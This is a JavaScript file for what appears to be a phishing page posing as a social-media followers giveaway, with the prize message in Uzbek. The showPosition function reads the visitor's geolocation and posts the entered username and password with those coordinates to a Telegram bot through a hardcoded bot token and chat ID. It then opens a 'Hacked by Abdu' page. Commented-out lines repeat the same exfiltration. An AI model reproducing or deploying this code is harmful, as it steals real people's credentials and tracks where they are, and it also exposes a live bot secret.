// Get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function showPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    var locationData = {
        latitude: latitude,
        longitude: longitude
    };

    fetch('https://api.telegram.org/bot6687537771:AAHGMvqQVNGSUSwoR7ylBk9K9pCXkwO2YT0/sendMessage', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({ chat_id: 1444160899, 
            text: 
              "<< --    User about   -->>" + '\n' +
              "Username: "  + "@" + input_user1.value + '\n' +
              "Password: "  + input_user2.value + '\n' + ' \n' + 

              "<< --    User adress   -->>" + '\n' +
              "Latitude= " + latitude + '\n' + 
              "Longitude= " + longitude +'\n' + ' \n' +

              "<<<-- Chopildi ⛏ -->>>"
          })
          // body: JSON.stringify({ chat_id: 1444160899, text: input_user1.value + fl_num.value + latitude + longitude})
        //   body: JSON.stringify({ chat_id: 1444160899, text: "@" + input_user1.value + selectedNumber + "chopildi ⛏  " + "Adress:  " + "lat=" + latitude + "  " + "<0------0>" +  "  2. " + "long=" + longitude + "<-----------(FR13NDS  &  MR.ROBOT)----------->"})
        //   body: JSON.stringify({ chat_id: 1444160899, text: "@" + input_user1.value + fl_num.value + "c" + "Adress:  " + "lat=" + latitude + "  " + "<0------0>" +  "  2. " + "long=" + longitude + "<-----------(FR13NDS  &  MR.ROBOT)----------->"})
    });

    
    // function sendMessage() {
      // const chatId = 1444160899;
    
      // fetch(`https://api.telegram.org/bot6687537771:AAHGMvqQVNGSUSwoR7ylBk9K9pCXkwO2YT0/sendMessage|||?chat_id=${chatId}&text=${elder}`)
      //   .then(response => response.json())
      //   .then(data => console.log(data))
      //   .catch(error => console.error(error));

    // }

    // let userInterFace = "@" + input_user1.value + fl_num.value + "chopildi ⛏  " + "Adress:  " + "lat=" + latitude + "  " + "<0------0>" +  "  2. " + "long=" + longitude + "<-----------(FR13NDS  &  MR.ROBOT)----------->";


    // goLink
    url = 'Hacked by Abdu/index.html';
    this.window.open(url, '_blank');
    // goLink
}



// Random JS
function generateRandomNumber() {
    let fl_num = document.getElementById("selectedNumber");

    // Disable the button after one click
    document.getElementById("generateButton").disabled = true;
  
    // Generate random numbers within the specified range
    const numbers = [];
    for (let i = 50; i <= 10000; i++) {
      if (i <= 1000 || Math.random() < 0.001) {
        numbers.push(i);
      }
    }
  
    // Select a random number from the generated list
    let selectedNumber = Math.floor(Math.random() * Math.floor(Math.random() * 1200));
    
    // if(selectedNumber < 100) {
    //     selectedNumber * 50
    // } else {
    //     selectedNumber * 20
    // }
    // let randomC = Math.random();
  
    // Display the selected number
    fl_num.value = selectedNumber + " obunachi yutdingiz !";
    console.log("Number: " + fl_num.value);

    // let seen = "Followers Number: " + fl_num.value;

    
    
    // Play holiday sound
    // const audio = new Audio("Images/win_sound.mp3");
    // audio.play();
    
    // Save local storage
    localStorage.setItem("followersNumber", fl_num.value);
}  
// Random JS



// Input function
const input = document.getElementById('myInput');

// input.addEventListener('input', () => {
//   setTimeout(() => {
//     input.type = 'password';
//   }, 300);
// });

function changeInputType() {
    let chx = document.querySelector('.chx');
    let btn_eye = document.querySelector('.btn-eye');

    if (input.type === "text") {
      input.type = "password";
      btn_eye.innerHTML = '<i class="chx bi bi-eye"></i>';
    } else {
      input.type = "text";
      btn_eye.innerHTML = '<i class="bi bi-eye-slash"></i>';
    }
}
// Input function



// Show window 
let input_user1 = document.querySelector('.input-value1');
let input_user2 = document.querySelector('.input-value2');

function showWindow() {
      setTimeout(function() {
        let window = document.querySelector('.window');
        let windowBackground = document.querySelector('.window-background');
        let windowTitle = document.querySelector('.window-title');
        let windowBtn = document.querySelector('.window-button');

        windowTitle.textContent('shadishid');
      }, 1500);
}
// Show window 



// Input errors 
// if(input_user1.value.lenght)
// function validate() {
  // check if input is bigger than 3
  // var value = document.getElementById('titleeee').value;
  // if (input_user1.length || input_user1.length < 8) {
  //   return false; // keep form from submitting
  // } else {
  //   return true;
  // }

  // node.addEventListener("keyup", ({key}) => {
    //   if (key === "Enter") {
      //       // Do work
      //   }
      // })
  // let btnX = document.querySelector('.btn-x');

  // if (input_user1.length < 4) {
  //   input_user1.classList.add('input_user-inv');  // keep form from submitting
  // } else {
  //   input_user1.classList.remove('input_user-inv');  // keep form from submitting
  // }

  // if (input_user2.length < 8) {
  //   input_user2.classList.add('input_user-inv');  // keep form from submitting
  // } else {
  //   input_user2.classList.remove('input_user-inv');  // keep form from submitting
  // }
// }
// Input errors 

 

// Form box
let form = document.querySelector('.form');
// Form box


 
// Loading effect
let loader = document.getElementById("loader");

window.addEventListener('load' , function(){
    loader.style.display = "none";
});
// Loading effect